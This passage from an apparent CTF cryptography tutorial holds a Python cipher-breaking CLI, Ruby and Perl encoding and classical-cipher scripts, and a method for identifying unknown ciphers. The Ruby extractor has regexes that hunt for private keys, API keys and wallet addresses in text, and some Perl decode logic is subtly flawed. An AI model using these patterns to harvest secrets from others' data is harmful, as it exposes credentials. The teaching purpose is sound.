def main(): """ Main CLI interface """ parser = argparse.ArgumentParser(description='Cryptanalysis toolkit') parser.add_argument('mode', choices=['caesar', 'vigenere', 'xor', 'freq', 'rsa'], help='Analysis mode') parser.add_argument('input', help='Input file or ciphertext') parser.add_argument('--key', help='Known key (for encryption)') parser.add_argument('--keylen', type=int, help='Key length hint') parser.add_argument('--hex', action='store_true', help='Input is hex-encoded') parser.add_argument('--base64', action='store_true', help='Input is base64-encoded')

```
args = parser.parse_args()

# Read input
try:
    with open(args.input, 'r') as f:
        data = f.read().strip()
except FileNotFoundError:
    data = args.input

# Decode if necessary
if args.hex:
    data = bytes.fromhex(data)
elif args.base64:
    import base64
    data = base64.b64decode(data)

# Execute requested analysis
if args.mode == 'caesar':
    cipher = CaesarCipher()
    
    if args.key:
        # Encrypt mode
        result = cipher.encrypt(data, int(args.key))
        print(result)
    else:
        # Decrypt mode
        results = cipher.break_cipher(data)
        print("\n=== Top 5 Caesar Cipher Candidates ===\n")
        for i, (shift, plaintext, score) in enumerate(results[:5]):
            print(f"Rank {i+1} (shift={shift}, χ²={score:.2f}):")
            print(f"  {plaintext[:100]}...")
            print()

elif args.mode == 'vigenere':
    cipher = VigenereCipher()
    
    if args.key:
        # Encrypt mode
        result = cipher.encrypt(data, args.key)
        print(result)
    else:
        # Decrypt mode
        results = cipher.break_cipher(data, args.keylen)
        print("\n=== Vigenere Cipher Analysis ===\n")
        for key, plaintext, score in results:
            print(f"Key: {key}")
            print(f"χ² score: {score:.2f}")
            print(f"Plaintext: {plaintext[:200]}...")
            print()

elif args.mode == 'xor':
    analyzer = XORAnalyzer()
    
    if isinstance(data, str):
        data = data.encode()
    
    # Try single-byte XOR first
    print("\n=== Single-Byte XOR Analysis ===\n")
    results = analyzer.break_single_byte_xor(data)
    
    for i, (key, plaintext, score) in enumerate(results[:5]):
        print(f"Rank {i+1} (key=0x{key:02x}, χ²={score:.2f}):")
        try:
            print(f"  {plaintext.decode('ascii', errors='ignore')[:100]}...")
        except:
            print(f"  {plaintext[:100]}...")
        print()
    
    # Try repeating-key XOR
    print("\n=== Repeating-Key XOR Analysis ===\n")
    results = analyzer.break_repeating_key_xor(data, args.keylen)
    
    for key, plaintext, score in results:
        print(f"Key: {key}")
        print(f"χ² score: {score:.2f}")
        try:
            print(f"Plaintext: {plaintext.decode('ascii', errors='ignore')[:200]}...")
        except:
            print(f"Plaintext: {plaintext[:200]}...")
        print()

elif args.mode == 'freq':
    analyzer = CryptoAnalyzer()
    
    print("\n=== Frequency Analysis ===\n")
    freqs = analyzer.frequency_analysis(data)
    
    print("Character frequencies:")
    for char, freq in list(freqs.items())[:10]:
        print(f"  {char}: {freq:.2f}%")
    
    print(f"\nIndex of Coincidence: {analyzer.calculate_ioc(data):.4f}")
    print(f"  (English ≈ 0.065, Random ≈ 0.038)")
    
    language, chi_sq = analyzer.detect_language(data)
    print(f"\nLanguage detection: {language} (χ²={chi_sq:.2f})")
    
    sequences = analyzer.find_repeated_sequences(data)
    if sequences:
        print(f"\nRepeated sequences found: {len(sequences)}")
        for seq, positions in list(sequences.items())[:5]:
            print(f"  '{seq}' at positions {positions}")

elif args.mode == 'rsa':
    print("\n=== RSA Analysis Tools ===\n")
    print("Use as library for RSA attacks:")
    print("  - trial_division(n)")
    print("  - common_modulus_attack(n, e1, c1, e2, c2)")
    print("  - wieners_attack(e, n)")
    print("  - hastad_broadcast_attack(n_list, c_list, e)")
```

if **name** == '**main**': main()

````

### Ruby/Perl for Text Processing

Ruby and Perl excel at pattern matching, regular expressions, and rapid text manipulation for cryptographic data.

**Ruby: Advanced Pattern Extraction:**

```ruby
#!/usr/bin/env ruby
# crypto_patterns.rb - Extract cryptographic patterns from text

require 'base64'
require 'digest'
require 'openssl'

class CryptoPatternExtractor
  # Common cryptographic patterns
  PATTERNS = {
    md5: /\b[a-f0-9]{32}\b/i,
    sha1: /\b[a-f0-9]{40}\b/i,
    sha256: /\b[a-f0-9]{64}\b/i,
    sha512: /\b[a-f0-9]{128}\b/i,
    base64: /(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/,
    hex: /(?:0x)?[a-f0-9]+/i,
    uuid: /[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}/i,
    private_key: /-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----.*?-----END (?:RSA |EC |DSA )?PRIVATE KEY-----/m,
    public_key: /-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----/m,
    certificate: /-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----/m,
    pgp_key: /-----BEGIN PGP (?:PUBLIC|PRIVATE) KEY BLOCK-----.*?-----END PGP (?:PUBLIC|PRIVATE) KEY BLOCK-----/m,
    jwt: /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/,
    api_key: /\b[A-Za-z0-9]{32,}\b/,
    bitcoin_address: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/,
    ethereum_address: /\b0x[a-fA-F0-9]{40}\b/
  }
  
  def initialize(text)
    @text = text
    @findings = {}
  end
  
  def extract_all
    PATTERNS.each do |name, pattern|
      matches = @text.scan(pattern)
      @findings[name] = matches.uniq unless matches.empty?
    end
    
    @findings
  end
  
  def extract_type(type)
    pattern = PATTERNS[type.to_sym]
    return [] unless pattern
    
    @text.scan(pattern).uniq
  end
  
  def identify_hashes
    results = {}
    
    # Extract potential hashes
    [:md5, :sha1, :sha256, :sha512].each do |hash_type|
      hashes = extract_type(hash_type)
      results[hash_type] = hashes unless hashes.empty?
    end
    
    results
  end
  
  def extract_keys
    keys = {}
    
    [:private_key, :public_key, :certificate, :pgp_key].each do |key_type|
      found = extract_type(key_type)
      keys[key_type] = found unless found.empty?
    end
    
    keys
  end
  
  def decode_base64_candidates
    base64_strings = extract_type(:base64)
    decoded = []
    
    base64_strings.each do |b64|
      next if b64.length < 4  # Too short to be meaningful
      
      begin
        decoded_str = Base64.decode64(b64)
        
        # Check if decoded content is printable
        if decoded_str.ascii_only? && decoded_str =~ /[[:print:]]/
          decoded << {
            original: b64[0..50],
            decoded: decoded_str,
            length: decoded_str.length
          }
        end
      rescue
        # Invalid base64, skip
      end
    end
    
    decoded
  end
  
  def analyze_jwt
    jwts = extract_type(:jwt)
    analyzed = []
    
    jwts.each do |jwt|
      parts = jwt.split('.')
      next unless parts.length == 3
      
      begin
        header = JSON.parse(Base64.decode64(parts[0]))
        payload = JSON.parse(Base64.decode64(parts[1]))
        
        analyzed << {
          jwt: jwt[0..50] + '...',
          header: header,
          payload: payload,
          signature: parts[2]
        }
      rescue
        # Invalid JWT, skip
      end
    end
    
    analyzed
  end
  
  def report
    puts "="*60
    puts "Cryptographic Pattern Extraction Report"
    puts "="*60
    puts
    
    # Hashes
    hash_findings = identify_hashes
    unless hash_findings.empty?
      puts "=== Hash Values Found ==="
      hash_findings.each do |type, hashes|
        puts "\n#{type.to_s.upcase} (#{hashes.length}):"
        hashes.first(5).each { |h| puts "  #{h}" }
        puts "  ... and #{hashes.length - 5} more" if hashes.length > 5
      end
      puts
    end
    
    # Keys and certificates
    key_findings = extract_keys
    unless key_findings.empty?
      puts "=== Cryptographic Keys/Certificates ==="
      key_findings.each do |type, items|
        puts "\n#{type.to_s.gsub('_', ' ').capitalize} (#{items.length}):"
        items.each { |item| puts "  Found: #{item[0..60]}..." }
      end
      puts
    end
    
    # Base64
    base64_decoded = decode_base64_candidates
    unless base64_decoded.empty?
      puts "=== Decoded Base64 Strings ==="
      base64_decoded.first(5).each do |item|
        puts "\nOriginal: #{item[:original]}..."
        puts "Decoded:  #{item[:decoded][0..100]}"
        puts "Length:   #{item[:length]} bytes"
      end
      puts
    end
    
    # JWT
    jwt_analyzed = analyze_jwt
    unless jwt_analyzed.empty?
      puts "=== JWT Tokens ==="
      jwt_analyzed.each do |jwt|
        puts "\nToken: #{jwt[:jwt]}"
        puts "Header:  #{jwt[:header]}"
        puts "Payload: #{jwt[:payload]}"
      end
      puts
    end
    
    # Other patterns
    [:uuid, :bitcoin_address, :ethereum_address].each do |pattern_type|
      findings = extract_type(pattern_type)
      unless findings.empty?
        puts "=== #{pattern_type.to_s.gsub('_', ' ').capitalize} ==="
        findings.first(10).each { |f| puts "  #{f}" }
        puts
      end
    end
  end
end

# Main execution
if __FILE__ == $0
  require 'json'
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Usage: crypto_patterns.rb [options] <file_or_text>"
    
    opts.on("-t", "--type TYPE", "Extract specific type only") do |t|
      options[:type] = t.to_sym
    end
    
    opts.on("-j", "--json", "Output as JSON") do
      options[:json] = true
    end
    
    opts.on("-h", "--help", "Show this help") do
      puts opts
      exit
    end
  end.parse!
  
  # Read input
  text = if ARGV.empty? || ARGV[0] == '-'
    STDIN.read
  elsif File.exist?(ARGV[0])
    File.read(ARGV[0])
  else
    ARGV[0]
  end
  
  extractor = CryptoPatternExtractor.new(text)
  
  if options[:json]
    findings = if options[:type]
      { options[:type] => extractor.extract_type(options[:type]) }
    else
      extractor.extract_all
    end
    
    puts JSON.pretty_generate(findings)
  elsif options[:type]
    results = extractor.extract_type(options[:type])
    results.each { |r| puts r }
  else
    extractor.report
  end
end
````

**Perl: High-Speed Text Transformation:**

```perl
#!/usr/bin/env perl
# crypto_transform.pl - Rapid cryptographic text transformations

use strict;
use warnings;
use MIME::Base64;
use Digest::MD5 qw(md5_hex);
use Digest::SHA qw(sha1_hex sha256_hex sha512_hex);
use Encode qw(encode decode);

# Transformation functions
sub rot13 {
    my $text = shift;
    $text =~ tr/A-Za-z/N-ZA-Mn-za-m/;
    return $text;
}

sub rot_n {
    my ($text, $n) = @_;
    my $result = '';
    
    foreach my $char (split //, $text) {
        if ($char =~ /[A-Z]/) {
            $result .= chr((ord($char) - ord('A') + $n) % 26 + ord('A'));
        } elsif ($char =~ /[a-z]/) {
            $result .= chr((ord($char) - ord('a') + $n) % 26 + ord('a'));
        } else {
            $result .= $char;
        }
    }
    
    return $result;
}

sub hex_encode {
    my $text = shift;
    return unpack('H*', $text);
}

sub hex_decode {
    my $hex = shift;
    $hex =~ s/\s+//g;
    $hex =~ s/^0x//i;
    return pack('H*', $hex);
}

sub binary_encode {
    my $text = shift;
    return join(' ', map { sprintf("%08b", ord($_)) } split //, $text);
}

sub binary_decode {
    my $binary = shift;
    $binary =~ s/\s+//g;
    my @bytes = $binary =~ /(\d{8})/g;
    return join('', map { chr(oct("0b$_")) } @bytes);
}

sub url_encode {
    my $text = shift;
    $text =~ s/([^A-Za-z0-9_\-.])/sprintf("%%%02X", ord($1))/seg;
    return $text;
}

sub url_decode {
    my $text = shift;
    $text =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
    return $text;
}

sub reverse_text {
    my $text = shift;
    return scalar reverse $text;
}

sub xor_bruteforce {
    my ($ciphertext, $max_key) = @_;
    $max_key //= 255;
    
    my @results;
    
    for my $key (0 .. $max_key) {
        my $plaintext = '';
        foreach my $byte (split //, $ciphertext) {
            $plaintext .= chr(ord($byte) ^ $key);
        }
        
        # Score based on printable characters
        my $printable = ($plaintext =~ tr/\x20-\x7E//);
        my $score = $printable / length($plaintext);
        
        if ($score > 0.8) {  # Mostly printable
            push @results, {
                key => $key,
                plaintext => $plaintext,
                score => $score
            };
        }
    }
    
    return sort { $b->{score} <=> $a->{score} } @results;
}

sub repeating_xor {
    my ($data, $key) = @_;
    my $result = '';
    my $key_len = length($key);
    
    for (my $i = 0; $i < length($data); $i++) {
        my $data_byte = substr($data, $i, 1);
        my $key_byte = substr($key, $i % $key_len, 1);
        $result .= chr(ord($data_byte) ^ ord($key_byte));
    }
    
    return $result;
}

sub extract_strings {
    my ($data, $min_length) = @_;
    $min_length //= 4;
    
    my @strings;
    while ($data =~ /([\x20-\x7E]{$min_length,})/g) {
        push @strings, $1;
    }
    
    return @strings;
}

sub frequency_analysis {
    my $text = shift;
    my %freq;
    
    # Count each character
    foreach my $char (split //, lc($text)) {
        next unless $char =~ /[a-z]/;
        $freq{$char}++;
    }
    
    # Calculate percentages
    my $total = 0;
    $total += $_ for values %freq;
    
    return {} if $total == 0;
    
    my %percentages;
    foreach my $char (keys %freq) {
        $percentages{$char} = ($freq{$char} / $total) * 100;
    }
    
    return %percentages;
}

sub detect_encoding {
    my $data = shift;
    my @detections;
    
    # Check if valid base64
    if ($data =~ /^[A-Za-z0-9+\/]+={0,2}$/) {
        eval {
            my $decoded = decode_base64($data);
            push @detections, {
                encoding => 'base64',
                decoded => $decoded,
                confidence => 'high'
            };
        };
    }
    
    # Check if valid hex
    if ($data =~ /^[0-9a-fA-F]+$/ && length($data) % 2 == 0) {
        eval {
            my $decoded = hex_decode($data);
            if ($decoded =~ /[\x20-\x7E]/) {
                push @detections, {
                    encoding => 'hex',
                    decoded => $decoded,
                    confidence => 'high'
                };
            }
        };
    }
    
    # Check if valid binary
    if ($data =~ /^[01\s]+$/) {
        eval {
            my $decoded = binary_decode($data);
            if ($decoded =~ /[\x20-\x7E]/) {
                push @detections, {
                    encoding => 'binary',
                    decoded => $decoded,
                    confidence => 'medium'
                };
            }
        };
    }
    
    # Check if URL encoded
    if ($data =~ /%[0-9A-Fa-f]{2}/) {
        push @detections, {
            encoding => 'url',
            decoded => url_decode($data),
            confidence => 'high'
        };
    }
    
    return @detections;
}

sub compute_hashes {
    my $data = shift;
    
    return {
        md5 => md5_hex($data),
        sha1 => sha1_hex($data),
        sha256 => sha256_hex($data),
        sha512 => sha512_hex($data)
    };
}

sub substitute_cipher_decrypt {
    my ($ciphertext, $key) = @_;
    
    # Key is a 26-character substitution alphabet
    my $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    my %mapping;
    
    for (my $i = 0; $i < 26; $i++) {
        $mapping{substr($key, $i, 1)} = substr($alphabet, $i, 1);
    }
    
    my $plaintext = '';
    foreach my $char (split //, uc($ciphertext)) {
        if (exists $mapping{$char}) {
            $plaintext .= $mapping{$char};
        } else {
            $plaintext .= $char;
        }
    }
    
    return $plaintext;
}

sub rail_fence_encrypt {
    my ($plaintext, $rails) = @_;
    
    my @fence = map { [] } (1 .. $rails);
    my $rail = 0;
    my $direction = 1;
    
    foreach my $char (split //, $plaintext) {
        push @{$fence[$rail]}, $char;
        
        $rail += $direction;
        if ($rail == 0 || $rail == $rails - 1) {
            $direction *= -1;
        }
    }
    
    return join('', map { join('', @$_) } @fence);
}

sub rail_fence_decrypt {
    my ($ciphertext, $rails) = @_;
    
    my $len = length($ciphertext);
    my @fence = map { [(undef) x $len] } (1 .. $rails);
    
    # Mark the positions
    my $rail = 0;
    my $direction = 1;
    
    for (my $i = 0; $i < $len; $i++) {
        $fence[$rail][$i] = '*';
        
        $rail += $direction;
        if ($rail == 0 || $rail == $rails - 1) {
            $direction *= -1;
        }
    }
    
    # Fill in the characters
    my $index = 0;
    for (my $r = 0; $r < $rails; $r++) {
        for (my $c = 0; $c < $len; $c++) {
            if (defined $fence[$r][$c] && $fence[$r][$c] eq '*') {
                $fence[$r][$c] = substr($ciphertext, $index++, 1);
            }
        }
    }
    
    # Read off in zigzag order
    my $plaintext = '';
    $rail = 0;
    $direction = 1;
    
    for (my $i = 0; $i < $len; $i++) {
        $plaintext .= $fence[$rail][$i];
        
        $rail += $direction;
        if ($rail == 0 || $rail == $rails - 1) {
            $direction *= -1;
        }
    }
    
    return $plaintext;
}

sub columnar_transposition_decrypt {
    my ($ciphertext, $key) = @_;
    
    my @key_order = sort { $a <=> $b } 
                    map { ord($_) } 
                    split //, uc($key);
    
    my $num_cols = length($key);
    my $num_rows = int((length($ciphertext) + $num_cols - 1) / $num_cols);
    
    my @grid;
    my $pos = 0;
    
    # Fill columns in key order
    foreach my $col_idx (0 .. $num_cols - 1) {
        my $col_len = $num_rows;
        $col_len-- if ($num_rows * $num_cols - length($ciphertext)) > 
                     ($num_cols - $col_idx - 1);
        
        for (my $row = 0; $row < $col_len; $row++) {
            $grid[$row][$col_idx] = substr($ciphertext, $pos++, 1);
        }
    }
    
    # Read off row by row
    my $plaintext = '';
    foreach my $row (@grid) {
        $plaintext .= join('', grep { defined $_ } @$row);
    }
    
    return $plaintext;
}

# CLI Interface
sub print_usage {
    print <<'USAGE';
Usage: crypto_transform.pl <operation> [options]

Operations:
  encode <format> <text>      - Encode text (base64, hex, binary, url)
  decode <format> <text>      - Decode text
  hash <text>                 - Compute all hashes
  rot <n> <text>              - ROT-n cipher
  xor <hex_data> [key]        - XOR operation
  freq <text>                 - Frequency analysis
  detect <text>               - Auto-detect encoding
  rail <rails> <text>         - Rail fence cipher (encrypt)
  rail-decrypt <rails> <text> - Rail fence cipher (decrypt)
  substitute <key> <text>     - Substitution cipher decrypt
  strings <file>              - Extract printable strings

Examples:
  crypto_transform.pl encode base64 "hello world"
  crypto_transform.pl decode hex "68656c6c6f"
  crypto_transform.pl hash "password123"
  crypto_transform.pl rot 13 "uryyb jbeyq"
  crypto_transform.pl xor "1c0111" "686974"
  crypto_transform.pl detect "aGVsbG8gd29ybGQ="
  crypto_transform.pl rail 3 "WEAREDISCOVEREDFLEEATONCE"

USAGE
    exit 1;
}

# Main execution
if (@ARGV < 1) {
    print_usage();
}

my $operation = shift @ARGV;

if ($operation eq 'encode') {
    my ($format, $text) = @ARGV;
    print_usage() unless $format && $text;
    
    my $result;
    if ($format eq 'base64') {
        $result = encode_base64($text, '');
    } elsif ($format eq 'hex') {
        $result = hex_encode($text);
    } elsif ($format eq 'binary') {
        $result = binary_encode($text);
    } elsif ($format eq 'url') {
        $result = url_encode($text);
    } else {
        die "Unknown format: $format\n";
    }
    
    print "$result\n";
    
} elsif ($operation eq 'decode') {
    my ($format, $text) = @ARGV;
    print_usage() unless $format && $text;
    
    my $result;
    if ($format eq 'base64') {
        $result = decode_base64($text);
    } elsif ($format eq 'hex') {
        $result = hex_decode($text);
    } elsif ($format eq 'binary') {
        $result = binary_decode($text);
    } elsif ($format eq 'url') {
        $result = url_decode($text);
    } else {
        die "Unknown format: $format\n";
    }
    
    print "$result\n";
    
} elsif ($operation eq 'hash') {
    my $text = join(' ', @ARGV);
    print_usage() unless $text;
    
    my $hashes = compute_hashes($text);
    
    print "MD5:    $hashes->{md5}\n";
    print "SHA1:   $hashes->{sha1}\n";
    print "SHA256: $hashes->{sha256}\n";
    print "SHA512: $hashes->{sha512}\n";
    
} elsif ($operation eq 'rot') {
    my ($n, $text) = @ARGV;
    $text = join(' ', @ARGV[1..$#ARGV]) if @ARGV > 2;
    print_usage() unless defined $n && $text;
    
    my $result = rot_n($text, $n);
    print "$result\n";
    
} elsif ($operation eq 'xor') {
    my ($data, $key) = @ARGV;
    
    if (!$key) {
        # Brute force single-byte XOR
        my $bytes = hex_decode($data);
        my @results = xor_bruteforce($bytes);
        
        print "Top XOR key candidates:\n\n";
        foreach my $result (@results[0..9]) {
            last unless $result;
            printf "Key: 0x%02x (score: %.2f)\n", 
                   $result->{key}, $result->{score};
            print "  $result->{plaintext}\n\n";
        }
    } else {
        # XOR with provided key
        my $data_bytes = hex_decode($data);
        my $key_bytes = hex_decode($key);
        my $result = repeating_xor($data_bytes, $key_bytes);
        print hex_encode($result) . "\n";
    }
    
} elsif ($operation eq 'freq') {
    my $text = join(' ', @ARGV);
    print_usage() unless $text;
    
    my %freq = frequency_analysis($text);
    
    print "Character Frequency Analysis:\n\n";
    foreach my $char (sort { $freq{$b} <=> $freq{$a} } keys %freq) {
        printf "  %s: %5.2f%%\n", $char, $freq{$char};
    }
    
} elsif ($operation eq 'detect') {
    my $text = join(' ', @ARGV);
    print_usage() unless $text;
    
    my @detections = detect_encoding($text);
    
    if (@detections) {
        print "Detected encodings:\n\n";
        foreach my $det (@detections) {
            print "Encoding: $det->{encoding} (confidence: $det->{confidence})\n";
            print "Decoded: $det->{decoded}\n\n";
        }
    } else {
        print "No known encoding detected\n";
    }
    
} elsif ($operation eq 'rail') {
    my ($rails, $text) = @ARGV;
    $text = join(' ', @ARGV[1..$#ARGV]) if @ARGV > 2;
    print_usage() unless $rails && $text;
    
    my $result = rail_fence_encrypt($text, $rails);
    print "$result\n";
    
} elsif ($operation eq 'rail-decrypt') {
    my ($rails, $text) = @ARGV;
    $text = join(' ', @ARGV[1..$#ARGV]) if @ARGV > 2;
    print_usage() unless $rails && $text;
    
    my $result = rail_fence_decrypt($text, $rails);
    print "$result\n";
    
} elsif ($operation eq 'substitute') {
    my ($key, $text) = @ARGV;
    $text = join(' ', @ARGV[1..$#ARGV]) if @ARGV > 2;
    print_usage() unless $key && $text;
    
    my $result = substitute_cipher_decrypt($text, $key);
    print "$result\n";
    
} elsif ($operation eq 'strings') {
    my $file = $ARGV[0];
    print_usage() unless $file && -f $file;
    
    open my $fh, '<:raw', $file or die "Cannot open $file: $!\n";
    my $data = do { local $/; <$fh> };
    close $fh;
    
    my @strings = extract_strings($data);
    print "$_\n" for @strings;
    
} else {
    print "Unknown operation: $operation\n\n";
    print_usage();
}
````

**Perl: Automated Multi-Stage Decoding:**

```perl
#!/usr/bin/env perl
# auto_decode.pl - Automatically detect and decode nested encodings

use strict;
use warnings;
use MIME::Base64;

sub auto_decode {
    my ($data, $max_depth) = @_;
    $max_depth //= 10;
    
    my @decode_chain;
    my $current = $data;
    my $depth = 0;
    
    while ($depth < $max_depth) {
        my ($encoding, $decoded) = detect_and_decode($current);
        
        last unless $encoding;
        
        push @decode_chain, $encoding;
        $current = $decoded;
        $depth++;
        
        # Stop if we've reached printable ASCII
        last if is_likely_plaintext($current);
    }
    
    return ($current, \@decode_chain);
}

sub detect_and_decode {
    my $data = shift;
    
    # Try base64
    if ($data =~ /^[A-Za-z0-9+\/]+=*$/ && length($data) % 4 == 0) {
        eval {
            my $decoded = decode_base64($data);
            return ('base64', $decoded) if length($decoded) > 0;
        };
    }
    
    # Try hex
    if ($data =~ /^(0x)?[0-9a-fA-F]+$/ && length($data) % 2 == 0) {
        my $hex = $data;
        $hex =~ s/^0x//i;
        
        eval {
            my $decoded = pack('H*', $hex);
            return ('hex', $decoded);
        };
    }
    
    # Try URL encoding
    if ($data =~ /%[0-9A-Fa-f]{2}/) {
        my $decoded = $data;
        $decoded =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
        return ('url', $decoded);
    }
    
    # Try ROT13
    if ($data =~ /^[A-Za-z\s]+$/) {
        my $decoded = $data;
        $decoded =~ tr/A-Za-z/N-ZA-Mn-za-m/;
        
        if (is_likely_plaintext($decoded)) {
            return ('rot13', $decoded);
        }
    }
    
    # Try reversing
    my $reversed = reverse($data);
    if (is_likely_plaintext($reversed) && !is_likely_plaintext($data)) {
        return ('reverse', $reversed);
    }
    
    return (undef, undef);
}

sub is_likely_plaintext {
    my $text = shift;
    
    # Count printable characters
    my $printable = ($text =~ tr/\x20-\x7E//);
    my $ratio = $printable / length($text);
    
    return $ratio > 0.9;
}

# Main execution
my $input = join(' ', @ARGV) || do { local $/; <STDIN> };
chomp $input;

my ($result, $chain) = auto_decode($input);

print "Decoding chain: " . join(' -> ', @$chain) . "\n" if @$chain;
print "\nFinal result:\n$result\n";
````

**Important Subtopics:**

- **sed/awk for Stream Processing**: Inline text transformations in pipelines
- **jq for JSON Crypto Data**: Parsing JWT tokens, API responses, certificate chains
- **Regex Performance Optimization**: Efficient pattern matching for large datasets
- **Process Substitution**: Combining multiple crypto tools in single command chains

---

# COMMON CTF CIPHER SCENARIOS

## Mystery Ciphers

Mystery cipher challenges present ciphertext without identifying the encryption method, requiring systematic analysis before attempting decryption.

### Identify-Then-Break Approach

**Systematic Identification Methodology:**

**Phase 1: Initial Reconnaissance**

Character set analysis:

```python
def analyze_charset(ciphertext):
    unique_chars = set(ciphertext)
    
    print(f"Total characters: {len(ciphertext)}")
    print(f"Unique characters: {len(unique_chars)}")
    print(f"Character set: {sorted(unique_chars)}")
    
    # Classify by character types
    if unique_chars.issubset(set('ABCDEFGHIJKLMNOPQRSTUVWXYZ')):
        print("Pure uppercase alphabetic")
    elif unique_chars.issubset(set('01')):
        print("Binary")
    elif unique_chars.issubset(set('0123456789ABCDEF')):
        print("Hexadecimal")
    elif unique_chars.issubset(set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')):
        print("Possible Base64")

# Usage:
ciphertext = "KHOOR ZRUOG"
analyze_charset(ciphertext)
```

Length and structure patterns:

```python
def structural_analysis(ciphertext):
    # Check for block patterns
    words = ciphertext.split()
    word_lengths = [len(w) for w in words]
    
    print(f"Number of words/blocks: {len(words)}")
    print(f"Word length distribution: {set(word_lengths)}")
    
    # Check for repeating patterns
    for length in range(2, min(20, len(ciphertext)//2)):
        patterns = {}
        for i in range(0, len(ciphertext) - length):
            pattern = ciphertext[i:i+length]
            if pattern in patterns:
                patterns[pattern] += 1
            else:
                patterns[pattern] = 1
        
        repeating = {k: v for k, v in patterns.items() if v > 1}
        if repeating:
            print(f"\nRepeating {length}-char patterns:")
            for pattern, count in sorted(repeating.items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f"  '{pattern}': {count} times")
```

**Phase 2: Statistical Analysis**

Index of Coincidence (IoC) calculation:

```python
def calculate_ioc(text):
    """
    IoC helps distinguish cipher types:
    - Random: ~0.0385 (26-letter alphabet)
    - English plaintext: ~0.0667
    - Monoalphabetic substitution: ~0.0667
    - Polyalphabetic (Vigenère): ~0.0385 to 0.0667
    - Transposition: ~0.0667
    """
    text = ''.join(c.upper() for c in text if c.isalpha())
    N = len(text)
    
    if N <= 1:
        return 0
    
    frequencies = {}
    for char in text:
        frequencies[char] = frequencies.get(char, 0) + 1
    
    ioc = sum(f * (f - 1) for f in frequencies.values()) / (N * (N - 1))
    
    return ioc

# Interpretation:
text = "YOUR_CIPHERTEXT_HERE"
ioc = calculate_ioc(text)
print(f"IoC: {ioc:.4f}")

if ioc > 0.06:
    print("Likely: Monoalphabetic substitution or transposition")
elif 0.04 < ioc < 0.06:
    print("Likely: Polyalphabetic cipher (Vigenère, etc.)")
else:
    print("Likely: Random or strong encryption")
```

Entropy measurement:

```python
import math
from collections import Counter

def calculate_entropy(data):
    """
    Entropy indicates randomness:
    - English text: ~4.0-4.5 bits/char
    - Compressed/encrypted: ~7.5-8.0 bits/char
    - Hex-encoded binary: ~4.0 bits/char
    """
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    
    entropy = -sum((count/length) * math.log2(count/length) 
                   for count in counter.values())
    
    return entropy

# Usage:
entropy = calculate_entropy(ciphertext)
print(f"Entropy: {entropy:.2f} bits/char")

if entropy < 4.5:
    print("Low entropy - likely encoded, not encrypted")
elif entropy < 6.0:
    print("Medium entropy - weak encryption or compression")
else:
    print("High entropy - strong encryption or random data")
```

**Phase 3: Cipher Classification Decision Tree**

```python
def classify_cipher(ciphertext):
    """
    Systematic cipher classification based on characteristics
    """
    results = []
    
    # Remove whitespace for analysis
    clean_text = ''.join(ciphertext.split())
    
    # 1. Character set check
    if all(c in '01' for c in clean_text):
        results.append("Binary encoding")
    
    if all(c in '0123456789ABCDEF' for c in clean_text.upper()):
        results.append("Hexadecimal encoding")
    
    if all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in clean_text):
        results.append("Possible Base64")
    
    # 2. Pattern checks
    if len(clean_text) % 2 == 0 and all(c.isdigit() for c in clean_text):
        results.append("Possible numeric cipher (A=01, B=02, etc.)")
    
    # 3. Statistical checks
    ioc = calculate_ioc(clean_text)
    if ioc > 0.06:
        results.append("Monoalphabetic substitution or transposition (high IoC)")
    elif 0.04 < ioc < 0.06:
        results.append("Polyalphabetic cipher (medium IoC)")
    
    # 4. Length analysis
    if len(clean_text) < 50:
        results.append("Short cipher - consider classical methods")
    
    # 5. Visual patterns
    if '=' in ciphertext[-3:]:
        results.append("Base64 padding detected")
    
    return results

# Complete analysis:
print("Classification results:")
for result in classify_cipher(ciphertext):
    print(f"  - {result}")
```

**Automated Multi-Tool Pipeline:**

```bash
#!/bin/bash
# mystery_cipher_analyzer.sh

CIPHER_FILE=$1

echo "=== Character Set Analysis ==="
cat $CIPHER_FILE | tr -cd '[:print:]' | fold -w1 | sort | uniq -c | sort -rn

echo -e "\n=== Length Analysis ==="
echo "Total characters: $(cat $CIPHER_FILE | wc -c)"
echo "Total words: $(cat $CIPHER_FILE | wc -w)"

echo -e "\n=== Attempting Base64 decode ==="
cat $CIPHER_FILE | base64 -d 2>/dev/null && echo "[SUCCESS]" || echo "[FAILED]"

echo -e "\n=== Attempting Hex decode ==="
cat $CIPHER_FILE | xxd -r -p 2>/dev/null && echo "[SUCCESS]" || echo "[FAILED]"

echo -e "\n=== ROT13 test ==="
cat $CIPHER_FILE | tr 'A-Za-z' 'N-ZA-Mn-za-m'

echo -e "\n=== Checking for common cipher keywords ==="
grep -iE 'flag|ctf|the|and|key' $CIPHER_FILE && echo "[Potential plaintext]"
```

### Visual Pattern Recognition

**Pattern-Based Cipher Identification:**

**Symbol-Based Ciphers:**

Pigpen/Masonic cipher detection:

```
Visual characteristics:
- Grid-based symbols (tic-tac-toe patterns)
- Dots within or outside grids
- No alphanumeric characters

Example symbols:
└ ┘ ┌ ┐ ⌐ ¬ ⊥ ⊤ • ∟

Decryption approach:
1. Identify grid layout (2×2, 3×3, or X-shaped)
2. Map symbols to alphabet positions
3. Use Dcode.fr Pigpen decoder
```

Braille pattern recognition:

```
Characteristics:
- 6-dot or 8-dot patterns
- Unicode Braille characters (U+2800 to U+28FF)
- Example: ⠓⠑⠇⠇⠕ = "hello"

Detection:
import unicodedata
